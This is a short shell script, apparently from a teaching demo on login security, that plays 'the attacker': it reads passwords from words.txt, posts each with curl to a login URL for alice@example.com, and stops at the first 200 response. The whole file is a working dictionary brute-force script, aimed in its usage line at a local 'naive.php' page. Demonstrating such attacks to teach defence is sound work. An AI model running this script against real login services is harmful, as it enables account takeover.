#!/bin/sh
# The attacker: try every password in words.txt against Alice's account,
# and print each answer's status code. Stops at the first 200.
# Usage: sh guess.sh http://localhost:8000/naive.php
while read -r guess; do
    status=$(curl -s -o /dev/null -w '%{http_code}' \
        --data-urlencode 'email=alice@example.com' --data-urlencode "password=$guess" "$1")
    echo "$status $guess"
    [ "$status" = 200 ] && break
done < words.txt
